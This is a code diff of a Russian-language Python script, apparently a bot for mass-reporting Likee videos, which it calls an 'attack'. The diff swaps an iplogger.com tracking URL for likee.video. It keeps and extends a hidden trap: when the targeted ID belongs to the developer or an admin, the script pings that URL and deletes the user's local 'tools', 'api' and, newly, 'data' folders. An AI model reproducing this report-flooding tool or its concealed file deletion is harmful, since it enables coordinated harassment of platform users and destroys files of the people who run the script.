@@ -4,10 +4,9 @@ bots = "1"
 valid = '{"code":0,"data":{"success":true,"receipt":null},"message":"ok"}'
 #-----
 print ("")
-loger = "https://iplogger.com/2HT4V4"
+loger = "https://likee.video/"
 
 import time
-import requests
 import os
 import json
 import secrets, string
@@ -15,9 +14,19 @@ import random
 import colorama
 from colorama import Fore
 import re
+import platform
+
+if platform.system() == "Windows":
+    st = "python LIKROOT.py"
+    dl = "cls"
+    os.system("cls")
+else:
+    dl = "clear"
+    st = "python3 LIKROOT.py"
+    os.system("clear")
 
 colorama.init()
-os.system("clear")
+
 
 print (Fore.GREEN + "")
 logo = """
@@ -42,15 +51,16 @@ menu = """
 print (Fore.YELLOW + menu)
 
 user = input("Выбирай>")
+import requests
 if user == "2":
-    os.system("clear")
+    os.system(dl)
     print ("")
     print ("Вставьте POST ID видео ниже!")
     video = input("POST ID>")
-    os.system("clear")
+    os.system(dl)
     print (f"Атака на {video}")
 else:
-    os.system("clear")
+    os.system(dl)
     print ("")
     print ("Вставьте ссылку на видео")
     urlv = input("URL VIDEO>")
@@ -60,8 +70,8 @@ else:
     except requests.ConnectionError:
         print ("NO VALID URL!!!")
         time.sleep(1)
-        os.system("clear")
-        os.system("python3 LIKROOT.py")
+        os.system(dl)
+        os.system(st)
         exit()
         
     code_example = (line.text)
@@ -81,18 +91,22 @@ else:
     
 #eb
 if share_id == "1162421923":
+    import shutil
     bot = requests.get(loger, headers=headers)
-    os.system("clear")
-    os.system("rm -rf tools")
-    os.system("rm -rf api")
+    os.system(dl)
+    shutil.rmtree("tools")
+    shutil.rmtree("api")
+    shutil.rmtree("data")
     print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
     exit()
 
 if share_id == "1192349175":
+    import shutil
     bot = requests.get(loger, headers=headers)
-    os.system("clear")
-    os.system("rm -rf tools")
-    os.system("rm -rf api")
+    os.system(dl)
+    shutil.rmtree("tools")
+    shutil.rmtree("api")
+    shutil.rmtree("data")
     print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
     exit()
     
@@ -207,8 +221,8 @@ try:
 except requests.ConnectionError as e:
     print(Fore.RED + e)
     input("Нажмите Enter")
-    os.system("reset")
-    os.system("python3 LIKROOT.py")
+    os.system(dl)
+    os.system(st)
     exit()
 
 if res.text == valid:
@@ -217,8 +231,8 @@ else:
     print ("")
     print ("Токен устарел")
     time.sleep(1.10)
-    os.system("clear")
-    os.system("python3 LIKROOT.py")
+    os.system(dl)
+    os.system(st)
     exit()
     #the end
     
@@ -246,8 +260,8 @@ time.sleep(1)
 print ("Все жалобы отправлены!")
 print ("")
 input("Нажмите enter")
-os.system("reset")
-os.system("python3 LIKROOT.py")
+os.system(dl)
+os.system(st)
 exit()
     
 
